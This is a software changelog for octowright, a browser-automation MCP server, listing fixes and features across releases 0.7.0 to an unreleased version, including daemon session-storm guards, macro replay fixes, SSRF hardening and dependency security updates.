  `default_url` now becomes Playwright's `base_url`, so
  `browser_navigate("/orders")` resolves per persona and the same macro replays
  against a local stack, a staging tier or production by launching it as a
  different persona. Deliberately silent when there is nothing to say: a profile
  name need not be a saved persona and a persona need not declare a
  `default_url` — both pass no `base_url` at all rather than `None`, so absolute
  URLs and every existing macro keep working untouched.
- **Explicit `LaunchOptions.base_url`.** A caller driving octowright as a library
  has no persona to speak for it — a suite replaying macros against a dev stack,
  a batch run pinned to one tier. Explicit wins over the persona's `default_url`,
  because a caller naming an origin is more specific than a default.
- **Concurrency cap on headed launches in `spawn_roster`
  (`OCTOWRIGHT_HEADED_LAUNCH_CONCURRENCY`, default 3).** A big headed roster or
  scenario now creates windows in batches instead of firing every launch at the
  same instant, bounded by a per-call semaphore; **headless is never throttled**
  and stays fully parallel. This is **defensive hardening, not a proven crash
  fix**: characterisation of the recurring headed-Chromium crash reproduced it via
  rapid *sequential* `browser_launch` churn, while concurrent `spawn_roster`
  launches did *not* reproduce it. Capping simultaneous window creation is still
  prudent — window-server / GPU pressure scales with it — and cheap. The exact
  churn trigger remains under investigation. An unparsable value falls back to the
  default; the floor is 1.

### Fixed
- **`browser_navigate` accepts a relative path.** `_reject_unsafe_url` demanded a
  scheme, so `/orders` never reached Playwright to be resolved at all. One
  leading slash is same-origin by construction — no scheme to deny, no new host
  to check — and is now allowed; **two** slashes is protocol-relative
  (`//evil.test/x` is a different host) and still goes through the absolute
  checks. That relaxation is only sound if the inherited origin is itself
  trusted, so `base_url` is now validated through the same guard every
  navigation uses — otherwise an unchecked `base_url` would be a way to reach a
  host the SSRF policy refuses by writing `/` in a macro.
- **Replay no longer reports failures for the passive rows the recorder emits.**
  The strip-list had drifted from the recorder with nothing checking it: sockets
  are recorded as `websocket_{direction}` (Playwright's `framesent` /
  `framereceived`) but the list still named `websocket_inbound` /
  `websocket_outbound`, an older vocabulary with no emitter left. Unclassified
  kinds count as errors in `dispatch_simple`, so one captured macro library
  carried 608 frames and reported **608 bogus failures on every replay**.
  `websocket_error`, `dialog_handled`, `download_saved` and
  `download_save_error` had the same gap — outcomes of something the harness
  did, not instructions to redo it. The dead `inbound`/`outbound` names are
  retained so recordings made under the older vocabulary still replay clean, and
  the two hand-maintained copies of this vocabulary (in `runtime` and
  `recording_import`, which disagreed with the recorder *and* with each other)
  are replaced by a derived `RECORDER_NOISE`. A new test pins the missing
  invariant: every event the recorder emits must be replayable, skipped or
  stripped, so any NEW unclassified event fails.
- **`switch_frame` and `get_text_by` are replayable.** Both were recorded and
  classified nowhere, so `dispatch_simple` counted each as an error rather than
  performing it — a macro that entered an iframe never re-entered it, and one
  that read a value never asserted on it. Each records its observation alongside
  its inputs, so each needed a drop entry: `switch_frame` records the frame it
  *landed* on (index, url, name) and replay must re-resolve that from the live
  page, since an index recorded yesterday means nothing today; `get_text_by`
  records the text it read, and dropping that matters more than usual because
  the method takes `**finders`, so a stray `result` would not raise as an
  unexpected kwarg — it would reach the locator builder as though it were a
  finder. `get_text_by` also needed allowlisting in `strip_non_aria_noise`,
  which treats the semantic locator keys as noise for every kind except
  `click`/`fill`/`click_by`/`fill_by`; those keys *are* this action's finders, so
  replaying one called `session.get_text_by()` with no finder at all. The
  allowlist enumerated three semantic actions and missed the fourth; it is now a
  named set.

- **`make act-test` was unpassable.** The CI test job installed Playwright
  browsers without `--with-deps` under `act`, so the container downloaded binaries
  that could not load (`error while loading shared libraries: libgbm.so.1`) and
  every live-browser test failed. Playwright warned at install time — "Host system
  is missing dependencies to run browsers" — but the step still exited 0, so the
  failure surfaced much later as a misleading "Target page, context or browser has
  been closed". `act` runs the same ubuntu image as root, so the apt step it was
  avoiding works there; the act-specific branch is gone and the condition is now
  simply "is this Linux". Contributor tooling only — GitHub CI always passed
  `--with-deps` and was never affected.

### Security
- **`cryptography` floor raised to 50.0.0** (PYSEC-2026-3552). Windows ARM64
  keeps its existing 46.0.3 pin — upstream ships no `win_arm64` wheels past that
  — and the pip-audit gate runs on Linux, so the exception does not weaken it.

## [0.13.8] - 2026-07-20

### Fixed
- **Leader-side protection against a follower reconnect/session storm.** A
  follower that churns StreamableHTTP sessions — each forwarded RPC opening a
  fresh session on the leader instead of reusing one — could pile per-session
  server tasks and transports onto the shared daemon until it was at multiple GB
  RSS and real tool calls were starved (observed live at **18 GB over 2 days**),
  making octowright appear to crash across every connected client. Every prior
  storm defense was *follower*-side, so it only helped once every client
  upgraded; the leader had no protection of its own. Two leader-side guards, on
  by default and deployable with a single daemon restart, independent of
  follower version:
  - **Per-source new-session rate limit** (`http/mcp_flap_guard`): a
    session-creating request (`POST /mcp` with no `Mcp-Session-Id`) beyond
    `OCTOWRIGHT_MCP_NEW_SESSION_MAX` per `OCTOWRIGHT_MCP_NEW_SESSION_WINDOW_SECONDS`
    (defaults 10 / 10 s) is rejected with `429 + Retry-After`, keyed by the
    `X-Octowright-Follower` header a current follower now sends. Old followers
    share one `anonymous` bucket — exactly the storm, collectively throttled.
    Legit clients create ~1 session and reuse it, so they never approach it.
  - **Session-table cap** (housekeeping job 4): when the live session table
    exceeds `OCTOWRIGHT_MCP_MAX_SESSIONS` (default 256), the most-idle sessions
    (abandoned before recently-active) are evicted back to the cap — a memory
    bound no follower can defeat. New metrics
    `octowright_mcp_new_session_throttled_total` and
    `octowright_mcp_session_evicted_total`.

## [0.13.7] - 2026-07-18

### Fixed
- **A daemon restart no longer disconnects every MCP client at once.** Each
  MCP client bridges to one shared leader daemon; when the leader goes
  unresponsive, a follower retries for `BRIDGE_LEADER_RECOVERY_WINDOW_SECONDS`
  and then exits (closing its client's stdio) so `serve.py` can respawn a
  leader. The default was **15s** — shorter than a real leader outage
  (`octowright restart` alone takes 20-30s+; a split-brain/port fight can last
  minutes), so on every restart all followers blew past the window at the same
  instant and octowright broke across every client simultaneously. Raised the
  default to **180s** (`proxy_runtime.py`): followers now wait out a normal
  restart and reconnect to the new leader transparently. A truly-gone leader
  takes up to 180s before a follower respawns one — an acceptable trade against
  a session-killing false-exit on every restart. Still tunable via
  `OCTOWRIGHT_BRIDGE_LEADER_RECOVERY_WINDOW_SECONDS`. Follower-side code: it
  rolls out passively as clients reconnect, not via a daemon restart.

### Added
- **Per-pool recordings root for concurrent-pools embedders.**
  `BrowserPool(recordings_dir=...)` routes one pool's per-launch artefacts (the
  JSONL log, video dir, HAR, and downloads) to a distinct root instead of the
  process-global `RECORDINGS_DIR`, so several `BrowserPool`s in one process no
  longer collide on a single recordings tree. The pool threads its root through
  the new `launch_helpers.build_recording_kwargs` combiner; downloads anchor on
  `session.log_path.parent`. Defaults to the global root (resolved at call time)
  — fully back-compatible for the one-pool daemon. Write-side only by design:
  the dashboard, closed-session discovery and `octowright cleanup` still read
  the process-global root, so a custom root suits an embedder that consumes the
  launch-returned paths directly (`video_dir`, `log_path`). Surfaced as the
  read-only `BrowserPool.recordings_dir` property.

## [0.13.6] - 2026-07-17

### Fixed
- **Split-brain daemons: closed in both directions.** A leader dying could leave
  two daemons alive on different ports (canonical + a bumped one), and
  `octowright restart` couldn't recover from it.
  - *No longer forms.* When a leader died, every follower ran the respawn path;
    the election flock serialized the spawn decision, but `wait_for_daemon` ran
    outside the lock — so the first follower released the flock before its
    spawned daemon bound the port, and a second follower then spawned a
    competitor that port-walked to a bumped port. The election lock is now held
    until the spawned daemon is confirmed up, so the next follower adopts the new
    leader and defers instead of forking a rival. A lock-acquire timeout defers
    quietly rather than spawning or raising.
  - *Restart recovers from an existing split-brain.* `octowright restart` scoped
    its process sweep to the lockfile leader's `--http-port` and then spawned on
    the canonical port; a rival leader holding the canonical port (whose command
    line may carry no `--http-port` at all) was never killed, so the bind failed
    and the daemon stayed down. Restart now reclaims the spawn port by the actual
    listening socket — command-verified as `octowright serve` — so the rival is
    cleared and a fresh daemon binds. Non-octowright port holders and bare MCP
    followers are never targeted.

## [0.13.5] - 2026-07-17

### Fixed
- **The orphan-browser reaper was killing Chromium's crash handlers.**
  `chrome_crashpad_handler` ships inside the browser bundle (under
  `ms-playwright/chromium-*/`), so it matched the reaper's browser-path filter,
  and it is deliberately spawned detached — the kernel reparents it to `ppid 1`,
  the exact signal `_is_orphaned_browser` reads as "the driver died, reap it." So
  every housekeeping cycle SIGKILLed both crash handlers of every live browser on
  the box (observed as a repeating `reaped_orphan_browsers count=2` with fresh
  pids each minute). Killing them freed nothing — a handler owns no window and the
  pool never drives it — and silently disabled Chromium crash reporting for
  perfectly healthy sessions, hiding the renderer crashes the handler exists to
  capture. Crash-reporter helpers (`crashpad_handler`, `crashreporter`) are now
  excluded from the reaper before the orphan rule runs; a genuinely reparented
  browser sitting beside a handler is still reaped.

### Security
- **Dependency refresh.** All locked dependencies bumped to their latest
  compatible versions, clearing three `mcp` advisories (CVE-2026-52870,
  CVE-2026-52869, CVE-2026-59950; `mcp` 1.27.1 → 1.28.1). No API or behavior
  changes in octowright — lockfile-only, verified against the full test suite.

## [0.13.4] - 2026-07-09

### Fixed
- **Recorded `mock_route`/`unmock_route` were dead on replay.** The recorder
  writes the field as `pattern` (matching the macro linter's required-field
  name), but the session methods' parameter is `url_pattern`. The replay
  rename table had no entry for either action, so any macro or recording
  replay touching route mocking raised `TypeError: unexpected keyword
  argument 'pattern'`.

## [0.13.3] - 2026-07-09

Addresses the root cause behind recurring "Octowright disconnected" reports: the
leader process itself leaking memory over multi-day uptime (observed as high as
18.8GB RSS under heavy concurrent-follower load), which stalls the daemon under
memory pressure and looks like a random disconnect.

### Added
- **Dead-follower MCP session reaper.** A new housekeeping job reaps leader-side
  StreamableHTTP sessions by PID liveness, independent of and complementary to
  `OCTOWRIGHT_MCP_SESSION_IDLE_SECONDS` (which stays off by default). A follower
  whose OS process is confirmed dead has its session terminated immediately —
  unlike idle-time reaping, this can never false-positive on a live client
  that's merely quiet (reading output, thinking, a long CI run), so it runs
  unconditionally and needs no opt-in.
- **Bridge-state tmp-file sweep.** A process killed mid atomic-write (crash,
  SIGKILL, an ungraceful restart) can orphan a `bridge-state.json.*.tmp`
  sibling forever; a new housekeeping job age-gates and removes these
  automatically (364 such files, some weeks old, were found and hand-cleaned
  during this investigation).
- `octowright_status()["bridge"]["follower_sessions_reaped"]` surfaces the
  pid-liveness reaper's running total, and `octowright_follower_session_reaped_total`
  is exported as a metric.

## [0.13.2] - 2026-07-05

A release-tooling fix, no package code changes.

### Fixed
- **PyPI trusted-publisher OIDC exchange.** The release workflow was a
  single job publishing straight to PyPI, but the `invalid-publisher`
  exchange failure meant nothing on pypi.org matched its OIDC claims. Split
  into a `build` job producing the wheel/sdist as an artifact, plus two
  conditional publish jobs: `publish-testpypi` (environment `testpypi`,
  test.pypi.org) for pre-release GitHub Releases, and `publish-pypi`
  (environment `pypi`, pypi.org) for full releases — matching the trusted
  publishers now configured on both.

## [0.13.1] - 2026-07-04

A hotfix for 0.12.1's idle-session reaper.

### Fixed
- **`OCTOWRIGHT_MCP_SESSION_IDLE_SECONDS` is now OFF by default**, not
  `300`s. Nothing pings the leader to reset a session's idle deadline
  between real tool calls, so an ordinary interactive pause — reading
  output, deciding what to say, watching a slow build/CI run — looked
  identical to an abandoned session to this timer, and live sessions were
  getting silently killed every few minutes. Mirrors `OCTOWRIGHT_IDLE_GRACE`'s
  existing philosophy: killing a live client session by default is worse
  than a slow leak. Set a positive value to opt in on a shared/CI host that
  wants bounded memory over long-lived idle sessions.

## [0.13.0] - 2026-07-04

Headed browsers now protect themselves by default.

### Added
- **Headed browsers protect-by-default.** A resolved-headed, non-ephemeral
  browser now launches with `protected=True` — an agent's reflex
  `browser_close` right after a screenshot is refused unless `force=True` is
  passed, so a window the user was told to watch can't be destroyed out from
  under them. Headless/CI/agent-internal browsers are completely untouched.
  Reuses the existing `protected` mechanism; no new API surface.
  Precedence: explicit `protected` arg → `OCTOWRIGHT_PROTECT_BROWSERS=1` (all)
  → `OCTOWRIGHT_PROTECT_HEADED` (headed, default **on**) → unprotected. New
  env var `OCTOWRIGHT_PROTECT_HEADED` (`=0` opts out). The refusal message is
  tailored by `protected_reason` to explain why and how to proceed. Resolves
  at the pool's single launch chokepoint, so direct `browser_launch`,
  `browser_spawn_roster`, and scenario launches are all covered, and the
  protection (and its reason) survives `relaunch_fluid`/`browser_handoff`.

### Fixed
- `relaunch_fluid`/`handoff_browser` now force-close the source browser during
  a relaunch/handoff — previously they didn't pass `force=True`, which was
  harmless while `protected` was rare but would have broken relaunch/handoff
  for any ordinary headed browser now that headed browsers protect by
  default. A relaunch is a transparent same-browser replacement, not a
  destructive close, matching the existing "internal rollback/teardown"
  `force=True` exception.

## [0.12.1] - 2026-07-02

A leader-memory hotfix. A reconnect storm could leave the daemon leader holding
gigabytes of RAM with zero live browsers; idle MCP sessions are now reaped.

### Fixed
- **Unbounded leader memory leak from abandoned MCP sessions.** The StreamableHTTP
  session manager defaults `session_idle_timeout=None` — it never reaps sessions,
  so every session's per-session server task + transport lingered in the manager's
  task group even after the client vanished (~54KB/session, unbounded — observed a
  leader at 2.4GB RSS with zero live browsers after ~17h of reconnect churn).
  `http/app.py` now sets the timeout on the manager after `streamable_http_app()`
  builds it; the manager resets the deadline on each request, so an active session
  is never reaped — only a truly idle/abandoned one, whose task then exits and
  frees its memory. Tunable via `OCTOWRIGHT_MCP_SESSION_IDLE_SECONDS` (default 300;
  `0`/`off` restores the leaky default). Reproduced (RSS 97→151MB over 1000
  abandoned sessions, linear) and validated (RSS flat at ~110MB with the reaper on).

## [0.12.0] - 2026-07-02

A follower-bridge stability release. The bridge that connects an MCP client
(Codex, Claude Code, …) to the shared daemon leader no longer surfaces false
"Octowright disconnected" errors on slow tool calls, delivers proactive
notifications in the default daemon deployment, and cannot be driven into a
reconnect storm or a split-brain second daemon.

### Added
- **Tool-call progress heartbeat.** The leader emits periodic MCP progress for
  every in-flight tool call (`server/_heartbeat.py`), reviving the follower's
  deadline re-arm so a slow-but-alive call keeps its bridge deadline alive as
  long as the leader event loop is alive. A genuinely wedged/dead leader still
  times out fast. Tunable via `OCTOWRIGHT_HEARTBEAT_INTERVAL_SECONDS` (default 8)
  and `OCTOWRIGHT_HEARTBEAT_MAX_SECONDS` (ceiling, default 600).
- **Proactive notifications in daemon mode.** The detached-daemon leader now
  streams `session_event_bus` over a new `GET /api/mcp-events` SSE endpoint, and
  the follower re-injects each frame into the local stdio client — so
  `browser_crashed` / `browser_recovered` / `driver_died` / `session_closed`
  reach stdio clients even though the HTTP-MCP transport carries no
  server-initiated notifications. A direct HTTP-MCP client (no follower) still
  gets none (SDK limitation), so `octowright_status()` remains the authoritative
  pull check.
- **`OCTOWRIGHT_BRIDGE_MIN_SESSION_SECONDS`** (default 2.0) — flap threshold for
  the reconnect backoff below.

### Fixed
- **False "disconnected" on slow tool calls.** A tool call that outran the flat
  bridge deadline surfaced as a transport disconnect even while the leader was
  working; the heartbeat above keeps it alive.
- **Reconnect transport storm.** A session the leader ended almost immediately
  reconnected with no backoff, busy-looping the leader into a
  `Created new transport` / `Terminating session` storm (observed ~300+/sec
  across followers). Both reconnect paths — a clean instant end and a
  connect-then-abort (`ClientDisconnect` / reset, whose `attempt` counter reset
  on each connect) — now throttle by an increasing flap backoff.
- **Split-brain second daemon.** A follower's respawn (and now the initial
  election) could bind a bumped port (6286 → 6287) and become a second leader
  beside a healthy one when the lockfile probe false-negatived during a storm.
  Both paths now probe the canonical port directly and adopt the existing leader
  instead of forking a competitor.

## [0.11.0] - 2026-06-29

A token-efficiency release for agentic browsing: Octowright keeps the broad
browser/macro/scenario surface, but adds cheaper discovery paths, bounded
summaries, and profile-aware follow-up guidance so agents can orient before
spending tokens on full snapshots or raw dumps.

### Added
- **HTTP-first web discovery tools.** New `web_page_outline`,
  `web_find_links`, and `web_site_links` tools fetch and parse public HTTP(S)
  pages without launching a browser, returning compact headings/link candidates
  and profile-aware next actions.
- **Compact browser discovery tools.** New `browser_links`,
  `browser_find_link`, `browser_fields`, `browser_find_field`,
  `browser_page_outline`, and `browser_observe` expose bounded DOM, form,
  navigation, console, network, and download summaries for live browser
  sessions.
- **Capture summaries and line/search follow-ups.** Stored captures now support
  summary-oriented payloads for markdown, snapshots, evaluate results, network
  logs, console logs, and recordings, with follow-up actions for targeted
  retrieval.
- **Profile-aware next actions.** Truncated or summarized responses now annotate
  follow-up tool suggestions that are hidden by the active
  `OCTOWRIGHT_PROFILE`, so agents know whether to call another compact tool or
  restart with a wider profile.
- **Dashboard live-preview fallback.** The frontend live preview falls back to
  screenshot polling when screencast streaming closes, keeping the debug view
  useful on engines or sessions where streaming is unavailable.

### Changed
- **Capability profiles were rebalanced for low-token browsing.** `core` now
  includes compact browser and HTTP discovery tools; `advanced` includes
  summaries for console, network, downloads, captures, and fan-out workflows.
  A core install now exposes 125 MCP tools by default (132 with the optional
  terminal extra), while `--profile=core` trims the visible surface to 31 tools.
- **Heavy read tools are more conservative by default.** Evaluate, text reads,
  snapshots, recording tails, console/network/download reads, and multi-browser
  fan-out now prefer bounded results with explicit follow-up actions for full
  payloads or targeted retrieval.
- **Large server modules were split by responsibility** so discovery, assertions,
  recording tailing, console summaries, capture summaries, and link scoring stay
  under the repo's LOC and complexity gates.

### Fixed
- **Profile-filtered test isolation.** Tests that assert exact follow-up action
  payloads now clear leaked `OCTOWRIGHT_PROFILE` state, preventing order-
  dependent failures in full-suite runs.
- **XML sitemap parsing uses `defusedxml`** in HTTP-first discovery.

## [0.10.1] - 2026-06-27

A bridge-resilience patch plus a terminal-connector tidy.

### Fixed
- **The follower bridge survives an MCP-client compaction freeze.** When a client
  (Codex/Claude compaction) SIGSTOPs the follower process, `time.monotonic()`
  keeps advancing while every task is frozen — so on resume the deadline watchdog
  saw in-flight requests already past due and failed them, and the reconnect that
  followed returned `400` because the bridge replayed the cached `initialize` but
  not the `notifications/initialized` after it (leaving the fresh leader session
  half-initialized). The watchdog now detects the suspension (a wall-clock gap far
  exceeding its sleep interval) and shifts in-flight deadlines forward by the
  frozen span instead of failing them, and reconnect replays the **full**
  handshake. New `OCTOWRIGHT_BRIDGE_SUSPEND_THRESHOLD_SECONDS` knob (default 5s)
  and `octowright_bridge_suspension_total` counter.

### Changed
- **Terminal connector vocabulary: canonical `ssh, telnet, pty` ordering** in
  `terminal/connector_config.py` (network connectors before local), matching the
  transport-vocabulary convention. The external contract is unchanged — the
  `terminal_launch` MCP `kind` arg and dispatch are preserved.

## [0.10.0] - 2026-06-26

A feature + hardening release: optional terminal sessions, self-healing
browsers, a default-on security baseline (all configurable), and real Windows
support.

### Added
- **Terminal sessions (optional `octowright[terminal]` extra).** Drive an
  in-process `provide-uterm` connector — local PTY, SSH, or telnet (CP437 + RFC
  854 for BBS art) — recorded to the same JSONL format as browsers. New
  `terminal_*` MCP tools, a `terminals` capability profile, scenario terminal
  participants, and a read-only **xterm.js** session view in the dashboard
  (lazy-loaded). Core never imports uterm; without the extra the tools simply
  don't register.
- **Self-healing + observability for the browser pool.** Renderer crashes
  auto-recover, a dead shared Playwright driver rebuilds itself, and lost
  sessions are captured (`OCTOWRIGHT_DRIVER_RELAUNCH`). Incidents + a computed
  health verdict surface in `octowright_status()`, and the server proactively
  pushes `browser_crashed` / `browser_recovered` / `driver_died` /
  `session_closed` MCP notifications.
- **Resource governors.** A browser cap (default 32) and an opt-in available-
  memory floor (`OCTOWRIGHT_MIN_FREE_MEMORY_MB`), enforced in the pool layer so
  `scenario_start` can't bypass them.
- **Security knobs** (secure defaults, opt-out where noted): `/mcp` capability
  token (`OCTOWRIGHT_BRIDGE_REQUIRE_TOKEN`, on), owner-only recordings
  (`OCTOWRIGHT_RECORDINGS_PRIVATE`, on), SSRF policy (`OCTOWRIGHT_SSRF_POLICY` /
  `OCTOWRIGHT_SSRF_ALLOW`, off), and a per-recording JSONL size ceiling
  (`OCTOWRIGHT_RECORDING_MAX_BYTES`, off).
- **Stability telemetry.** RSS histogram, driver-restart / launch-refused /
  driver-lost / leader-recovery counters, and trace-context propagation across
  the follower→leader bridge.
- **Windows support.** A real Win32 `GetProcessMemoryInfo` RSS reader so the
  memory governor and RSS telemetry work on Windows (no psutil dependency).

### Changed
- **The follower bridge survives a leader restart / hard kill** instead of
  dropping the client: supervised reconnect with idempotent in-flight resume,
  and bridge health in `octowright_status()["bridge"]`.
- **Recordings are written `0600` (parent `0700`) by default**, and credential
  redaction now also covers the selector-less sinks (`press_key` / `evaluate` /
  `select_option`) under `OCTOWRIGHT_REDACT_INPUTS=all`.
- **The idle watchdog stays off by default** and `--keep-alive` propagates to
  the detached daemon (carried over and reaffirmed from 0.9.1).

### Fixed
- **A crashed renderer is recovered by replacing the page**, not a `reload()`
  that silently failed on a dead renderer.
- **Disk-write containment**: browser downloads reduce the remote
  Content-Disposition filename to a safe basename; golden + capture files are
  written atomically (temp-sibling + rename) to defeat a symlink TOCTOU.
- **The navigate telemetry span strips `user:pass@` userinfo and the query
  string** so credentials/tokens don't reach traces.
- **`octowright restart` verifies the lockfile pid is an `octowright serve`
  process** before signalling it, so a stale/recycled pid isn't friendly-fired;
  the daemon sweep is scoped to the managed port.
- **Cross-platform fixes** for Windows (path separators, process discovery, and
  POSIX-only test assumptions).

### Security
- Closes the unauthenticated loopback `/mcp` RCE for processes that can't read
  the `0600` lockfile (cross-user / sandbox), adds opt-in SSRF blocking
  (literal private / loopback / cloud-metadata hosts, incl. macro replay), and
  keeps recorded credentials owner-only — see the "Disk-write containment",
  "Recording-file privacy", and "Bridge capability token" sections in AGENTS.md.
- **Dependency CVE remediation**: cryptography → 49.0.0 (win-arm64 stays on the
  newest installable 46.0.3), starlette → 1.3.1, python-multipart → 0.0.32,
  msgpack → 1.2.1, pydantic-settings → 2.14.2.

## [0.9.1] - 2026-06-12

Reliability fixes for the follower/daemon bridge: the daemon no longer
disconnects clients mid-session, and follower processes no longer leak.

### Changed
- **Idle watchdog disabled by default.** The daemon holds live browser state, and
  its idle auto-exit closed the follower's stdio mid-session — breaking the MCP
  connection and dropping open browsers with no transparent wake (the user had to
  reconnect by hand). The daemon now stays up until an explicit `octowright
  restart`. Opt back into auto-exit for CI / shared / resource-constrained hosts
  with `OCTOWRIGHT_IDLE_GRACE=<seconds>` or `--idle-grace`; `off` / `never` /
  `none` / `disabled` / `0` / a non-positive value also disable it.

### Fixed
- **`--keep-alive` now reaches the daemon.** `spawn_daemon` forwards `--keep-alive`
  to the detached daemon; previously the flag was silently dropped, so it never
  reached the process that actually owns the watchdog.
- **Detached daemon stays alive after stdio EOF.** The watchdog task was also what
  held a discoverable daemon up past its `/dev/null` stdin EOF; with auto-quit off
  by default the daemon exited the instant it spawned (`daemon_spawn_failed`,
  falling back to fragile inline mode). The post-EOF "keep serving" phase now keys
  on being discoverable and waits on the HTTP sidecar, watchdog or not.
- **Followers no longer outlive their client.** When the MCP client closes stdin,
  the follower arms a daemon-thread hard-exit backstop, so a wedged remote teardown
  can't leave an orphaned `octowright serve` process reconnecting forever. Grace is
  `OCTOWRIGHT_FOLLOWER_EXIT_BACKSTOP_SECONDS` (default 5s).

## [0.9.0] - 2026-06-11

### Added
- **Browser crash detection** — Playwright's `page.on('crash')` (renderer
  "Aw, Snap" / `Target.crashed`) is now wired. The session is marked crashed, a
  proactive `notifications/octowright/browser_crashed` notification fires
  (carrying `instance_id`, `kind`, `scope`, `log_path`, and an actionable
  `hint`), eviction reports `reason="crashed"`, and a later tool call on a
  crashed instance says "crashed (its process died) — relaunch" instead of an
  opaque failure. A pure hard-kill that fires no crash event still reads as a
  normal external close (Playwright Python can't read the child exit signal).
- **Idempotent bridge resume** — the follower injects a stable
  `octowrightIdempotencyKey` into each `tools/call` and re-sends it verbatim
  after a reconnect; a new leader-side dedup cache (TTL + size bounded,
  success-only, with dead-session takeover and a bounded await) makes the
  re-sent call a no-op instead of double-executing a side-effectful tool. The
  bridge now auto-resumes in-flight requests (bounded by
  `OCTOWRIGHT_BRIDGE_RESUME_MAX_ATTEMPTS`, default 3) rather than failing them.
  Disable with `OCTOWRIGHT_IDEMPOTENCY=0` to restore the prior fail-safe.
- **Per-tool bridge timeouts + macro progress** — long tools no longer hit the
  flat 20s in-flight deadline. A per-tool floor (`BRIDGE_TOOL_TIMEOUTS`:
  browser_launch ~105s, macro_run 120s, macro_run_sequence 180s; env-overridable)
  replaces the flat default, and `macro_run` / `macro_run_sequence` stream MCP
  progress per step, which re-arms the deadline while progress flows. A mid-macro
  failure now reports `executed` + `executed_actions` so a half-applied replay
  shows exactly what landed.
- **`browser_snapshot` heavy-DOM degrade** — a snapshot that would exceed
  `OCTOWRIGHT_SNAPSHOT_TIMEOUT_SECONDS` (12s, kept below the bridge timeout)
  returns a typed `{snapshot_timed_out, hint}` pointing at
  `browser_read_markdown` / a scoped selector instead of hanging until the
  transport gives up.

### Changed
- **Telemetry now flows through `provide.telemetry` ≥ 0.4.8** — Octowright
  dropped its local `span()` / metrics helpers for the library's governed
  equivalents (consent / sampling / backpressure), which also fixes the per-call
  OpenTelemetry cross-context detach error that previously spammed the daemon
  log on every tool call. HTTP request metrics moved to the library's
  `TelemetryMiddleware` (RED metrics + request-id / W3C trace propagation +
  cardinality-safe routes), exported over OTLP. `OCTOWRIGHT_HTTP_METRICS` now
  gates metric recording only; context propagation stays on.
- **Saved macros no longer bake in recorder noise** — passive recorder events
  (`user_navigation`, console, websocket, markdown-cache, etc.) are stripped at
  `macro_save`, so replays carry only the intentional steps.

### Removed
- **Bespoke `/api/metrics` Prometheus scrape endpoint** — HTTP metrics now flow
  through `provide.telemetry` → OTLP, uniform with the rest of Octowright's
  telemetry. Point an OTLP collector at the process instead of scraping.
  **Breaking** for anyone scraping the old endpoint.

### Fixed
- **Bridge-state / followers registry bounded** — `bridge-state.json` no longer
  accumulates stale per-PID follower snapshots (dead PIDs are pruned), and
  `octowright_status` caps the exposed followers/events so the payload can't blow
  past the MCP client's tool-result limit (a 242 KB status once made the call
  unusable).
- **Macro progress-pill locator collision** — the in-page status pill now renders
  in a closed shadow root, so its echoed action text (e.g. "… | click_by
  text=Place order") no longer doubles a `get_by_text(...)` match and breaks the
  macro's own replay.
- **"Died vs never existed" messaging** — `pool.get` on an instance that was
  evicted (crashed or closed externally) now reports that it ended unexpectedly
  and to relaunch, distinct from a never-launched id.

## [0.8.0] - 2026-06-09

### Added
- **`macro_repair_apply`** — applies a stored-heuristic repair to one macro
  action: rewrites a brittle selector-based `click` / `fill` into its semantic
  `click_by` / `fill_by` form (from the `role` / `label` / `text` / `test_id`
  captured at record time), drops the stale CSS selector, and saves the macro in
  place. Completes the repair loop (`macro_repair_preview` → `macro_repair_apply`
  → `macro_run`); raises before any write on an out-of-range index or an action
  with no stored semantic locator.
- **Post-upgrade "what's new" notice** — the first run after a version change
  records curated highlights, surfaced in `octowright_status()` (`upgrade` block)
  and echoed once as a startup banner (a human terminal in inline mode, the
  daemon log otherwise). New `octowright.upgrade` module; `OCTOWRIGHT_UPGRADE_STATE`
  overrides the last-seen-version marker path.
- **Dead-server reconnect guidance** — when the octowright MCP transport is
  disconnected (tools missing, or `Transport closed` that doesn't recover after
  one retry), the agent is steered to reconnect octowright in its client — asking
  which client and using its native reconnect rather than guessing — instead of
  substituting a shell-opened browser it can't drive. Carried in the agent skill,
  the MCP server instructions, and the follower-bridge error text.

### Changed
- **`browser_snapshot` and `browser_brief` respect the active frame** — after
  `browser_switch_frame` they descend into the switched iframe (matching the
  action tools) instead of always reading the top-level page.

### Fixed
- **Frame-blind read tools** — `capture_create` (snapshot/text content + url),
  `browser_capture_and_close` (url + aria), `browser_read_markdown` (url), and
  `golden_save` (url) now follow the active frame instead of mixing frame
  content with top-page metadata.
- **Stale documentation corrected** — `8765` → `6286` dashboard-port references in
  the getting-started and troubleshooting docs (the port moved in 0.7.0), and the
  MCP tool-surface counts across the docs and architecture diagrams now reflect the
  real 111-tool surface.

## [0.7.0] - 2026-06-06

### Added
- **`/new-tab` landing page** — the default destination for `browser_launch`
  with no `url`. A self-contained page served by the local HTTP server: Otto
  logo, lowercase `octowright` wordmark, a live status strip (version · short
  commit · uptime · live browser count · dashboard link), and a background tint
  that shifts with the time of day. Replaces the old `octowright.com` default,
  which caused cert/network failures offline.
- **Cmd+T new-tab override on all three engines** — pressing Cmd+T (or Ctrl+T)
  now lands on `/new-tab`. Chromium uses a generated unpacked background
  service-worker extension (no settings-override prompt); Firefox uses a context
  page-event redirector; WebKit uses an injected keydown handler (opens a window,
  since its shell has no tab bar).
- **Context-aware default browser label** — a no-label/no-profile launch derives
  a human-readable label and persistent profile from (in priority)
  `OCTOWRIGHT_DEFAULT_LABEL`, `.octowright/config.yaml`, the git repo name, or
  the username — instead of a random instance ID. A persona matching the project
  slug is auto-adopted.
- **`.octowright/config.yaml` project config** — `label` / `persona` / `profile`
  keys, read from the nearest parent directory. Scaffolded by `octowright init`.
- **Configurable, richer badge** — `OCTOWRIGHT_BADGE_OPACITY` (default 0.35, more
  translucent); all 8 badge positions including the four center anchors; an
  Alt-click info popup showing session id/label/url with dashboard and recording
  links.
- **`browser_each`** — a single fan-out tool (navigate / resize / evaluate /
  wait_for / screenshot across N browsers) replacing the five `browser_*_each`
  tools.
- **`nav_warning`** — a failed initial navigation leaves the browser alive and
  reports the error in the launch result instead of destroying the instance.
- New env vars: `OCTOWRIGHT_DEFAULT_URL`, `OCTOWRIGHT_DEFAULT_LABEL`,
  `OCTOWRIGHT_BADGE_OPACITY`.

### Changed
- **Default HTTP port 8765 → 6286** ("OCTO"). Override with
  `OCTOWRIGHT_HTTP_PORT`.
- **`browser_click` / `browser_fill` take ARIA locator params directly**
  (`role`, `label`, `text`, `test_id`) — folded in from the removed
  `browser_click_by` / `browser_fill_by`.
- No-URL launches resolve the actual bound HTTP port at launch time, so they
  work even when the port auto-bumped.

### Fixed
